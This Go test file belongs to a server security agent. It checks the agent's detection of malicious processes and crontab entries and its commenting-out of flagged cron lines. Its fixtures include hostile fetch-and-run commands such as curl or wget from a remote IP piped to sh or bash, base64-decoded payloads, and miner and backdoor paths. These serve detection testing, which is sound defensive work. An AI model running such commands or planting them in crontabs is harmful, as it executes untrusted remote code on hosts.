package monitor

import (
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
	"github.com/xmarthost/xmartguard/agent/internal/store"
)

func TestJudge(t *testing.T) {
	cases := []struct {
		p    ProcInfo
		home string
		bad  bool
	}{
		{ProcInfo{Exe: "/usr/bin/php", Cmdline: "php /home/u/public_html/cron.php"}, "/home/u", false},
		{ProcInfo{Exe: "/home/u/public_html/wp-content/.x/kworker", Cmdline: "kworker"}, "/home/u", true},
		{ProcInfo{Exe: "/tmp/.ICE/sd", Cmdline: "sd"}, "/home/u", true},
		{ProcInfo{Exe: "/home/u/bin/app (deleted)", Cmdline: "app"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/python3", Cmdline: "python3 miner.py -o stratum+tcp://pool.example:3333"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/node", Cmdline: "node /home/u/app/server.js"}, "/home/u", false},
	}
	for _, c := range cases {
		if _, bad := Judge(c.p, c.home); bad != c.bad {
			t.Errorf("%+v: got %v", c.p, bad)
		}
	}
}

func TestJudgeCron(t *testing.T) {
	bad := []string{
		"*/5 * * * * curl -fsSL http://198.51.100.9/x.sh | sh",
		"* * * * * wget -q -O /tmp/.s http://198.51.100.9/s",
		"@reboot /dev/shm/.k/run >/dev/null 2>&1",
		"*/10 * * * * echo aGVsbG8K | base64 -d | bash",
		"@reboot /home/u/.config/.x/run",
		"* * * * * /usr/local/bin/php /home/u/public_html/wp-content/uploads/2024/05/cache.php",
		"*/30 * * * * GS_ARGS=\"-k abc -liqD\" /home/u/.config/htop/defunct",
		"* * * * * /home/u/.kinsing",
	}
	good := []string{
		"# comment",
		"MAILTO=user@example.com",
		"*/15 * * * * /usr/local/bin/php /home/u/public_html/wp-cron.php >/dev/null 2>&1",
		"0 3 * * * /usr/bin/mysqldump db > /home/u/backup.sql",
		"0 * * * * /usr/local/bin/php /home/u/public_html/artisan schedule:run >> /dev/null 2>&1",
		"@reboot /home/u/bin/node-app-start.sh",
		"#xpguard-disabled# * * * * * curl http://x/a | sh",
	}
	for _, l := range bad {
		if _, b := JudgeCron(l); !b {
			t.Errorf("not flagged: %s", l)
		}
	}
	for _, l := range good {
		if r, b := JudgeCron(l); b {
			t.Errorf("flagged (%s): %s", r, l)
		}
	}
}

func TestCheckCronOnce(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	os.WriteFile(filepath.Join(cron, "bob"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	os.WriteFile(filepath.Join(cron, "trusted"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	st.Patch([]byte(`{"cron":{"whitelist_users":["trusted"]}}`))
	var got []Event
	st.Patch([]byte(`{"cron":{"disable":false}}`))
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	m.CheckCron()
	if len(got) != 1 || got[0].User != "bob" {
		t.Fatalf("events: %+v", got)
	}
	evs, total, _ := m.Events("cron", 10, 0)
	if total != 1 || evs[0].Reason == "" {
		t.Fatalf("stored: %+v", evs)
	}
}

// Like cPGuard: malicious lines are commented out, the rest of the crontab
// is kept, and the administrator can switch a line back on for good.
func TestCronDisableAndEnable(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	Crontab = ""
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	if !st.Get().Cron.Disable {
		t.Fatal("disabling must be on by default")
	}
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	good := "*/15 * * * * /usr/local/bin/php /home/bob/public_html/wp-cron.php >/dev/null 2>&1"
	bad := "*/5 * * * * curl -s http://198.51.100.9/a | bash"
	evil := "* * * * * /usr/local/bin/php /home/bob/public_html/x/y.php"
	file := filepath.Join(cron, "bob")
	os.WriteFile(file, []byte("MAILTO=\"\"\n"+good+"\n"+bad+"\n"+evil+"\n"), 0o600)
	// y.php is a file the scanner found.
	db.Exec(`INSERT INTO findings (source, path, category, signature, status, created_at, updated_at) VALUES ('manual','/home/bob/public_html/x/y.php','virus','php.webshell','quarantined',1,1)`)
	var got []Event
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	b, _ := os.ReadFile(file)
	want := "MAILTO=\"\"\n" + good + "\n" + DisabledPrefix + bad + "\n" + DisabledPrefix + evil + "\n"
	if string(b) != want {
		t.Fatalf("crontab:\n%s", b)
	}
	if len(got) != 2 || got[0].Action != "disabled" || got[1].Reason != "runs a file detected as malware" {
		t.Fatalf("events %+v", got)
	}
	m.CheckCron() // nothing left to do
	if len(got) != 2 {
		t.Fatalf("again: %+v", got)
	}
	if err := m.EnableCron("bob", bad); err != nil {
		t.Fatal(err)
	}
	m.CheckCron()
	b, _ = os.ReadFile(file)
	if !strings.Contains(string(b), "\n"+bad+"\n") || len(got) != 2 {
		t.Fatalf("re-enabled line disabled again:\n%s %+v", b, got)
	}
	if fi, _ := os.Stat(file); fi.Mode().Perm() != 0o600 {
		t.Fatal("mode changed")
	}
}
